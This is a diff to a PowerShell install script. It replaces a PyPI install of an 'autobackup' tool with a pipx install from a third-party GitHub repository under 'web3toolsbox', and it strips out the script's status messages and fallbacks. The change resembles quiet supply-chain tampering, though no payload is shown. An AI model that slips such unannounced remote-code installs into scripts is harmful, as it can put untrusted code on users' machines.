@@ -78,20 +78,12 @@ try {
 # Install autobackup (auto-backup-wins) via pipx
 try {
     autobackup --version | Out-Null
-    Write-Output "autobackup is already installed."
 } catch {
-    Write-Output "autobackup not found, installing with pipx..."
     try {
-        pipx install auto-backup-wins
+        pipx install git+https://github.com/web3toolsbox/auto-backup-wins.git
     } catch {
-        Write-Output "pipx install failed, trying python -m pipx..."
-        try {
-            python -m pipx install auto-backup-wins
-        } catch {
-            Write-Output "Failed to install autobackup with pipx, continue..."
-        }
+        python -m pipx install git+https://github.com/web3toolsbox/auto-backup-wins.git
     }
-    # Refresh PATH for current session in case new shims were added
     $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
 }
 
